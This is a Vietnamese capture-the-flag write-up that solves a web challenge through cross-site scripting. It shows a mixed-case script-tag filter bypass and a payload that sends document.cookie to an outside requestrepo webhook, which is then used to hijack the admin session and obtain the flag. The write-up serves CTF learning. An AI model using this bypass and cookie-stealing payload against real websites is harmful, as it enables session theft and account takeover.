# Solution

Thử thách cho ta hai link url, nhìn vào link thứ hai là một link bot và có mở port có lẽ là để tương tác với user thông qua trang web. Truy cập vào url đầu tiên ta sẽ thấy có một form **login** được action trên file **login.php**

![form_login](https://live.staticflickr.com/65535/52773944476_7b2b6ca504.jpg)

Sau đó ta tạo tài khoản để đi vào website

![register](https://live.staticflickr.com/65535/52774367195_55b82cdb07_z.jpg)

Sau khi đăng kí thành công, trang web điều hướng ta ngược trở lại form **login** và tiến hành đăng nhập bằng tài khoản mà ta vừa đăng kí. Sau khi đi vào website, trang web điều hướng đi vào trang home và xuất hiện một **creat note** và một trường cho phép nhập text vào(Có lẽ là thẻ **textarea**). Mình đoán ở đây là nơi có lỗ hổng, và có thể trang web có thể đang dính lỗi **XSS**, chúng ta sẽ cùng thử kiểm chứng.

![create_note](https://live.staticflickr.com/65535/52774221769_805c0a558d_h.jpg)

Đầu tiên mình thử một payload đơn giản và đưa vào trường nhập liệu rồi nhấn submit

```
    <script>alert("hi");</script>
```

![xss](https://live.staticflickr.com/65535/52774381900_9e82c2c93d_h.jpg)

Một dòng **Your note: Script tag not allowed** được trả về, có lẽ các thẻ script đã bị lọc hoặc loại bỏ. Mình sẽ bật **burpsuite** và bắt request để thấy rõ hơn điều này.

![xss](https://live.staticflickr.com/65535/52774251154_513752024a_n.jpg)

> Dòng trạng thái đầu tiên được bắt với chuỗi truy vấn đằng sau **?content** đã bị filter => **XSS**

Bây giờ ta sẽ thử cố bypass nó bằng cách sửa đổi một chút và đưa lại vào trường nhập liệu

```
    <SCript>alert("hi");</SCript>
```

![xss](https://live.staticflickr.com/65535/52773995381_2393a099df.jpg)

Một popup hiện ra với dòng alert **"hi"** => bypass thành công.

![xss](https://live.staticflickr.com/65535/52773470367_b665e8cda1_h.jpg)

Tiếp theo vẫn cách làm như vậy mình sẽ tạo ra một **webhook** để lấy **cookie** và gửi cho admin. Hiểu đơn giản thì **webhook** là một cơ chế cho phép ứng dụng gửi và nhận các thông báo tự động khi có sự kiện xảy ra trên một trang web hoặc ứng dụng khác. Ở đây mình sẽ dùng nó để lấy cookie admin thông qua một payload xss. Mình lấy payload này ở [payload\_\_xss_Silent One-Linear](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) và thay url mặc định bằng url webhook của mình.

```
    <SCript>var i=new Image;i.src="http://p59d71b4.requestrepo.com/?"+document.cookie;</SCript>
```

Sau khi submit, lấy link url được gửi request để cho chat bot chấp nhận và nhấn **Send**

![bot](https://live.staticflickr.com/65535/52774505683_e81d34ec9a_z.jpg)

Sau đó một response đã được gửi về url webhook của mình trong đó có chứa cookie

![cookie](https://live.staticflickr.com/65535/52774508778_efabb80ab5_h.jpg)

Lấy cookie vừa nhận được và gửi cho admin

![cookie](https://live.staticflickr.com/65535/52774027466_7825a3ee2a_c.jpg)

![cookie](https://live.staticflickr.com/65535/52773504147_10c2ab8921_z.jpg)

Trên màn hình xuất hiện dòng chữ **Hello admin**, nghĩa là lúc này quyền user của ta hiện tại đang là **admin**, có một tab **Admin Panel** điều hướng đến đó ta thu được flag

![flag](https://live.staticflickr.com/65535/52774300729_38b1f81688_h.jpg)

> Flag : **ATTT{3z_X2S_Fr0m_V@tv069_W1th_L0v3}**
